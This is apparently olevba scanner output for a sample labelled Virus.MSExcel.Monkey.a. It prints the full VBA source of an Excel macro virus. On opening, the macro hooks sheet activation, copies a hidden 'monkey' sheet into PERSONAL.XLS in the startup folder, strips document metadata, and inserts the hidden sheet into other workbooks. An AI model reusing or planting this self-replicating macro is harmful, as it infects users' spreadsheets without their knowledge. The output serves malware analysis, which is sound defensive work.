olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Monkey.a-4104e9906b0f79c4fe2332ef8774d33cc7756325
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO monkey 
in file: Virus.MSExcel.Monkey.a-4104e9906b0f79c4fe2332ef8774d33cc7756325 - OLE stream: 'monkey'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
i = 0
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
i = 0
    c$ = Application.StartupPath
    i = 0

    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    i = 0

    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    i = 0

    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    i = 0

    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    i = 0

    n4$ = ActiveWorkbook.Name
    i = 0

    Sheets("monkey").Visible = True
    i = 0

    Sheets("monkey").Select
    i = 0

    Sheets("monkey").Copy
    i = 0

    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    i = 0

    newname$ = ActiveWorkbook.Name
    i = 0

    c4$ = CurDir()
    i = 0

    ChDir Application.StartupPath
    i = 0

    ActiveWindow.Visible = False
    i = 0

    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    i = 0

    Workbooks(n4$).Sheets("monkey").Visible = False
    i = 0

    Application.OnSheetActivate = ""
    i = 0

    Application.ScreenUpdating = True
    i = 0

    Application.OnSheetActivate = "personal.xls!check_files"
    i = 0

    Case 1
    Application.ScreenUpdating = False
    i = 0

    n4$ = ActiveWorkbook.Name
    i = 0

    p4$ = ActiveWorkbook.Path
    i = 0

    s$ = Workbooks(n4$).Sheets(1).Name
    i = 0

    If s$ <> "monkey" Then
        Workbooks("PERSONAL.XLS").Sheets("monkey").Copy before:=Workbooks(n4$).Sheets(1)
        i = 0

        Workbooks(n4$).Sheets("monkey").Visible = False
        i = 0

    Else
    End If
    i = 0
    Application.OnSheetActivate = ""
    i = 0
    Application.ScreenUpdating = True
    i = 0
    Application.OnSheetActivate = "personal.xls!check_files"
    i = 0
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  monke
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

